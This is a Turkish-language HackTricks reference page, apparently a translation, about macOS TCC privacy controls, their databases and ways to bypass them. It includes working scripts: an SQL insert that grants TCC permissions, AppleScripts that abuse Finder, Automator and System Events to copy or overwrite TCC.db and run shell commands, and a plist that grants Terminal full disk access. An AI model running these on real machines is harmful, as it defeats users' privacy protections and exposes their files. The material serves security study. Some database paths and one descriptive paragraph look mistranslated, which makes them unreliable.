# macOS TCC

<details>

<summary><strong>AWS hackleme becerilerinizi sıfırdan ileri seviyeye taşıyın</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek**.

</details>

## **Temel Bilgiler**

**TCC (Transparency, Consent, and Control)**, uygulama izinlerini düzenlemeye odaklanan bir güvenlik protokolüdür. Temel amacı, **konum hizmetleri, kişiler, fotoğraflar, mikrofon, kamera, erişilebilirlik ve tam disk erişimi** gibi hassas özellikleri korumaktır. TCC, bu unsurlara uygulama erişimini vermeden önce açık kullanıcı onayını zorunlu kılarak, gizlilik ve kullanıcı verileri üzerindeki kontrolü artırır.

Kullanıcılar, uygulamaların korunan özelliklere erişim isteğinde bulunduğunda TCC ile karşılaşırlar. Bu, kullanıcılara **erişimi onaylama veya reddetme** seçeneği sunan bir uyarı aracılığıyla görülebilir. Ayrıca, TCC, **dosyaları bir uygulamaya sürükleyip bırakma** gibi doğrudan kullanıcı eylemlerini de destekleyerek, uygulamaların sadece açıkça izin verilenlere erişmesini sağlar.

![TCC uyarı örneği](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**, `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` konumunda bulunan **daemon** tarafından yönetilir ve `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` dosyasında yapılandırılır (mach servisi `com.apple.tccd.system`'e kaydedilir).

Her oturum açmış kullanıcı için tanımlanan `/System/Library/LaunchAgents/com.apple.tccd.plist` dosyasında çalışan bir **kullanıcı modu tccd** bulunur ve mach servisleri `com.apple.tccd` ve `com.apple.usernotifications.delegate.com.apple.tccd`'yi kaydeder.

Burada sistem olarak çalışan tccd'yi ve kullanıcı olarak çalışan tccd'yi görebilirsiniz:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
İzinler, **ebeveyn** uygulamadan miras alınır ve **izinler**, **Bundle ID** ve **Developer ID**'ye dayanarak takip edilir.

### TCC Veritabanları

İzinler daha sonra bazı TCC veritabanlarında saklanır:

* **`/Library/Application Support/com.apple.TCC/TCC.db`** adresindeki sistem genelindeki veritabanı.
* Bu veritabanı **SIP korumalıdır**, bu yüzden sadece SIP atlatma yapabilen bir işlem yazabilir.
* Kullanıcı TCC veritabanı **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** kullanıcı tercihleri için.
* Bu veritabanı, yüksek TCC ayrıcalıklarına sahip işlemler (FDA gibi) tarafından yazılabilir (ancak SIP tarafından korunmaz).

{% hint style="warning" %}
Önceki veritabanları da **okuma erişimi için TCC korumalıdır**. Bu nedenle, düzenli kullanıcı TCC veritabanınızı, TCC ayrıcalıklı bir işlemden okuyamazsınız.

Ancak, bu yüksek ayrıcalıklara sahip bir işlem (FDA veya **`kTCCServiceEndpointSecurityClient`**) kullanıcıların TCC veritabanını yazabilir.
{% endhint %}

* **`/var/db/locationd/clients.plist`** adresinde üçüncü bir TCC veritabanı bulunur ve konum hizmetlerine erişime izin verilen istemcileri belirtir.
* SIP korumalı **`/Users/carlospolop/Downloads/REG.db`** dosyası (TCC ile okuma erişimine karşı da korumalı), tüm geçerli TCC veritabanlarının **konumunu** içerir.
* SIP korumalı **`/Users/carlospolop/Downloads/MDMOverrides.plist`** dosyası (TCC ile okuma erişimine karşı da korumalı), daha fazla TCC verilen izin içerir.
* Herkes tarafından okunabilir olan SIP korumalı **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** dosyası, TCC istisnası gerektiren uygulamaların bir izin listesidir.

{% hint style="success" %}
**iOS**'teki TCC veritabanı **`/private/var/mobile/Library/TCC/TCC.db`** adresindedir.
{% endhint %}

{% hint style="info" %}
**Bildirim Merkezi UI**, **sistem TCC veritabanında** değişiklik yapabilir:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Ancak, kullanıcılar **`tccutil`** komut satırı yardımcı programıyla kuralları **silebilir veya sorgulayabilir**.
{% endhint %}

#### Veritabanlarını sorgula

{% tabs %}
{% tab title="kullanıcı DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="sistem DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Her iki veritabanını kontrol ederek bir uygulamanın izinlerini kontrol edebilirsiniz, izin verilen, yasaklanan veya izin istenen izinler.
{% endhint %}

* **`service`**, TCC izinlerinin dize temsilidir.
* **`client`**, izinlere sahip olan **bundle ID** veya **binary'nin yolu**'dur.
* **`client_type`**, bir Bundle Kimliği(0) veya mutlak bir yol(1) olup olmadığını belirtir.

<details>

<summary>Eğer mutlak bir yol ise nasıl yürütülür</summary>

Sadece **`launctl load you_bin.plist`** yapın, bir plist ile:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** farklı değerlere sahip olabilir: denied(0), unknown(1), allowed(2) veya limited(3).
* **`auth_reason`** aşağıdaki değerleri alabilir: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* **csreq** alanı, yürütülecek ikili dosyanın nasıl doğrulanacağını ve TCC izinlerinin nasıl verileceğini belirtmek için kullanılır:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Tablonun **diğer alanları** hakkında daha fazla bilgi için [**bu blog yazısını kontrol edin**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Ayrıca, `Sistem Tercihleri --> Güvenlik ve Gizlilik --> Gizlilik --> Dosyalar ve Klasörler` bölümünde **uygulamalara verilen izinleri** kontrol edebilirsiniz.

{% hint style="success" %}
Kullanıcılar **`tccutil`** kullanarak **kuralları silip sorgulayabilirler**.
{% endhint %}

#### TCC izinlerini sıfırlama
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC İmza Kontrolleri

TCC veritabanı, uygulamanın **Bundle ID**'sini depolar, ancak aynı zamanda bir izni kullanmak için başvuran uygulamanın doğru olduğunu kontrol etmek için **imza** hakkında **bilgi** de depolar.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Bu nedenle, aynı adı ve paket kimliğini kullanan diğer uygulamalar, diğer uygulamalara verilen izinlere erişemeyecektir.
{% endhint %}

### Yetkilendirmeler ve TCC İzinleri

Uygulamalar, **sadece** bazı kaynaklara **erişim talep etmekle** kalmaz, aynı zamanda **ilgili yetkilendirmelere sahip olmalıdır**.\
Örneğin, **Telegram**, kameraya **erişim talep etmek** için `com.apple.security.device.camera` yetkilendirmesine sahiptir. Bu yetkilendirmeye sahip olmayan bir **uygulama**, kameraya erişemez (ve kullanıcı izinleri için bile sorulmaz).

Ancak, uygulamaların `~/Masaüstü`, `~/İndirilenler` ve `~/Belgeler` gibi **belirli kullanıcı klasörlerine erişmek** için herhangi bir **özel yetkilendirmeye ihtiyaçları yoktur**. Sistem, erişimi şeffaf bir şekilde yönetecek ve gerektiğinde kullanıcıya **izin isteyecektir**.

Apple'ın uygulamaları **izin istemeyecektir**. İzinler listelerinde **önceden verilmiş haklar** bulundururlar, bu da **hiçbir zaman bir açılır pencere oluşturmayacaklarını** ve **TCC veritabanlarının** hiçbirinde görünmeyeceklerini gösterir. Örneğin:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Bu, Takvim'in kullanıcının hatırlatıcılarına, takvimine ve adres defterine erişim istemesini engelleyecektir.

{% hint style="success" %}
Yetkilendirmeler hakkında bazı resmi belgelerin yanı sıra, yetkilendirmeler hakkında **ilginç bilgilere** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) adresinden ulaşabilirsiniz.
{% endhint %}

Bazı TCC izinleri şunlardır: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Tüm izinleri tanımlayan genel bir liste bulunmamaktadır, ancak bu [**bilinen izinlerin listesini**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) kontrol edebilirsiniz.

### Hassas korumasız yerler

* $HOME (kendisi)
* $HOME/.ssh, $HOME/.aws, vb.
* /tmp

### Kullanıcı Niyeti / com.apple.macl

Daha önce belirtildiği gibi, bir Uygulamaya bir dosyaya erişim izni vermek için onu sürükleyip bırakarak yapılabilir. Bu erişim, herhangi bir TCC veritabanında belirtilmeyecek, ancak dosyanın **uzatılmış bir özniteliği** olarak saklanacaktır. Bu öznitelik, izin verilen uygulamanın UUID'sini **saklayacaktır**.
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
İlginç olan şudur ki, **`com.apple.macl`** özelliği tccd tarafından değil, Sandbox tarafından yönetilir.

Ayrıca, bir dosyayı bilgisayarınızdaki bir uygulamanın UUID'sine izin veren bir başka bilgisayara taşırsanız, aynı uygulama farklı UID'lere sahip olacağından, o uygulamaya erişim sağlamaz.
{% endhint %}

Uzatılmış öznitelik `com.apple.macl`, diğer uzatılmış öznitelikler gibi **SIP tarafından korunduğu için** **temizlenemez**. Bununla birlikte, [**bu gönderide açıklandığı gibi**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), dosyayı **sıkıştırarak**, **silmeyi** ve **sıkıştırmayı** devre dışı bırakmak mümkündür.

## TCC Ayrıcalıkları ve Atlamaları

### TCC'ye Ekleme

Bir noktada TCC veritabanı üzerinde yazma erişimi elde ederseniz, aşağıdaki gibi bir şey kullanarak bir giriş ekleyebilirsiniz (yorumları kaldırın):

<details>

<summary>TCC'ye ekleme örneği</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Yükleri

Bir uygulamaya bazı TCC izinleriyle girmeyi başardıysanız, aşağıdaki sayfayı kontrol edin ve TCC yüklerini kötüye kullanmak için kullanın:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### FDA\* için Otomasyon (Finder)

Otomasyon izni için TCC adı: **`kTCCServiceAppleEvents`**\
Bu belirli TCC izni aynı zamanda TCC veritabanında yönetilebilecek **uygulamayı belirtir** (bu nedenle izinler her şeyi yönetmeye izin vermez).

**Finder**, her zaman FDA'ya sahip olan bir uygulamadır (UI'de görünmese bile), bu nedenle onun üzerinde **Otomasyon** ayrıcalıklarınız varsa, ayrıcalıklarını kötüye kullanarak **bazı işlemler yapabilirsiniz**.\
Bu durumda uygulamanızın **`com.apple.Finder`** üzerinde **`kTCCServiceAppleEvents`** iznine ihtiyacı olacaktır.

{% tabs %}
{% tab title="Kullanıcıların TCC.db'sini çalma" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% tab title="Sistemlerin TCC.db'sini çalma" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Bunu kullanarak **kendi kullanıcı TCC veritabanınızı yazabilirsiniz**.

{% hint style="warning" %}
Bu izinle, Finder'a TCC kısıtlı klasörlere erişim isteyebilir ve dosyaları size verebilirsiniz, ancak bildiğim kadarıyla Finder'ın FDA erişimini tam olarak kötüye kullanmak için keyfi kod çalıştıramazsınız.

Bu nedenle, tam FDA yeteneklerini kötüye kullanamayacaksınız.
{% endhint %}

Bu, Finder üzerinde Otomasyon ayrıcalıklarını elde etmek için TCC istemidir:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
**Automator** uygulamasının **`kTCCServiceAppleEvents`** TCC iznine sahip olması nedeniyle, Finder gibi herhangi bir uygulamayı kontrol edebilir. Bu nedenle, Automator'ı kontrol etme iznine sahipseniz aşağıdaki gibi bir kodla **Finder'ı da kontrol edebilirsiniz**:
{% endhint %}

<details>

<summary>Automator içinde bir kabuk alın</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Aynı durum **Script Editor uygulaması** için de geçerlidir, Finder'ı kontrol edebilir, ancak bir AppleScript kullanarak bir betiği çalıştırmaya zorlayamazsınız.

### Otomasyon (SE) bazı TCC'lere

**System Events, Klasör Eylemleri oluşturabilir ve Klasör eylemleri bazı TCC klasörlerine erişebilir** (Masaüstü, Belgeler ve İndirilenler), bu nedenle aşağıdaki gibi bir betik bu davranışı kötüye kullanmak için kullanılabilir:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Otomasyon (SE) + Erişilebilirlik (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** için FDA\*

**`System Events`** üzerinde otomasyon + Erişilebilirlik (**`kTCCServicePostEvent`**) işlemleri, işlemlere **tuş vuruşları göndermeyi** sağlar. Bu şekilde Finder'ı kötüye kullanarak kullanıcıların TCC.db dosyasını değiştirebilir veya isteğe bağlı bir uygulamaya FDA verebilirsiniz (ancak bunun için şifre istenebilir).

Finder üzerinden kullanıcıların TCC.db dosyasını değiştirme örneği:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` için FDA\*e

[**Erişilebilirlik izinlerini**](macos-tcc-payloads.md#accessibility) kötüye kullanmak için bazı payloadlar için bu sayfaya bakın. Bu izinlerle FDA\*e yükseltme yapabilir veya örneğin bir tuş takipçisi çalıştırabilirsiniz.

### **Endpoint Security Client için FDA**

Eğer **`kTCCServiceEndpointSecurityClient`**'e sahipseniz, FDA'ye sahipsiniz. Bitti.

### System Policy SysAdmin Dosyası için FDA

**`kTCCServiceSystemPolicySysAdminFiles`**, bir kullanıcının ev klasörünü değiştiren **`NFSHomeDirectory`** özelliğini **değiştirmenize** olanak sağlar ve böylece TCC'yi **atlayabilirsiniz**.

### Kullanıcı TCC DB'si için FDA

Kullanıcı TCC veritabanı üzerinde **yazma izinleri** elde etmek, kendinize **`FDA`** izinleri veremez, yalnızca sistem veritabanında yaşayan kişi bunu yapabilir.

Ancak, kendinize **`Finder için Otomasyon hakları`** verebilir ve önceki teknikleri kötüye kullanarak FDA\*e yükseltme yapabilirsiniz.

### **FDA'dan TCC izinlerine**

Tam Disk Erişimi'nin TCC'deki adı **`kTCCServiceSystemPolicyAllFiles`**'dir.

Bu gerçek bir yükseltme olmadığını düşünüyorum, ancak yine de faydalı bulabilirsiniz: FDA'ye sahip bir programı kontrol ediyorsanız, kullanıcı TCC veritabanını değiştirebilir ve kendinize herhangi bir erişim verebilirsiniz. Bu, FDA izinlerinizi kaybedebileceğiniz durumlarda kalıcılık teknikleri olarak kullanışlı olabilir.

### **SIP Geçişi ile TCC Geçişi**

Sistem **TCC veritabanı**, **SIP** tarafından korunmaktadır, bu yüzden yalnızca belirtilen yetkilendirmelere sahip işlemler onu değiştirebilecektir. Bu nedenle, bir saldırgan bir **SIP geçişi** bulursa (SIP tarafından kısıtlanmış bir dosyayı değiştirebilme), aşağıdakileri yapabilir:

* Bir TCC veritabanının korumasını **kaldırabilir** ve kendisine tüm TCC izinlerini verebilir. Örneğin, aşağıdaki dosyalardan herhangi birini kötüye kullanabilir:
* TCC sistem veritabanı
* REG.db
* MDMOverrides.plist

Ancak, bu **SIP geçişini TCC geçişi için kullanmanın başka bir seçeneği** vardır. `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` dosyası, TCC istisnası gerektiren uygulamaların bir izin listesidir. Bu nedenle, bir saldırgan bu dosyanın **SIP korumasını kaldırabilir** ve kendi **uygulamasını ekleyebilirse**, uygulama TCC'yi atlayabilir. Örneğin, terminali eklemek için:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:

Bu dosya, macOS TCC (Transparency, Consent, and Control) özelliğinin bir parçasıdır. TCC, kullanıcının gizlilik ve güvenlik ayarlarını kontrol etmesine olanak tanır. AllowApplicationsList.plist, kullanıcının belirli uygulamaların belirli izinlere sahip olmasına izin veren bir beyaz liste içerir.

Bu beyaz liste, kullanıcının hangi uygulamaların hangi izinlere sahip olabileceğini belirlemesine olanak tanır. Örneğin, kullanıcı belirli bir uygulamanın mikrofonunu veya kamerayı kullanmasına izin vermek istiyorsa, bu uygulamayı AllowApplicationsList.plist dosyasına ekleyebilir.

Dosya, /Library/Application Support/com.apple.TCC klasöründe bulunur ve root kullanıcısı tarafından düzenlenebilir. Ancak, bu dosyanın düzenlenmesi dikkatli bir şekilde yapılmalıdır, çünkü yanlış yapılandırma güvenlik açıklarına neden olabilir veya istenmeyen izinlerin verilmesine yol açabilir.

Bu dosyanın düzenlenmesi, kullanıcının gizlilik ve güvenlik ayarlarını özelleştirmesine olanak tanır, ancak dikkatli olunmalı ve yalnızca güvenilir uygulamaların izinlere erişmesine izin verilmelidir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Geçişleri

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-geçişleri](macos-tcc-bypasses/)
{% endcontent-ref %}

## Referanslar

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ile öğrenin</strong>!</summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github reposuna **PR göndererek paylaşın**.

</details>
